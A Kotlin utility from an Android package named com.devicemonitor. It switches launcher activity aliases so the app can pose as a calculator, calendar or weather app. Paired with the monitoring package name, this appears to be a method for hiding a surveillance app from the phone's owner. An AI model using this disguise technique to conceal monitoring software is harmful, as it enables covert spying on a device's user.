package com.devicemonitor.utils

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object AppIdentityManager {

    fun morphApp(context: Context, targetIdentity: String) {
        val packageManager = context.packageManager
        
        val aliases = mapOf(
            "default" to "com.devicemonitor.LauncherDefault",
            "calculator" to "com.devicemonitor.LauncherCalculator",
            "calendar" to "com.devicemonitor.LauncherCalendar",
            "weather" to "com.devicemonitor.LauncherWeather"
        )

        val targetAlias = aliases[targetIdentity] ?: return

        // Enable target alias and disable others
        aliases.values.forEach { alias ->
            val state = if (alias == targetAlias) {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            }
            
            packageManager.setComponentEnabledSetting(
                ComponentName(context, alias),
                state,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}
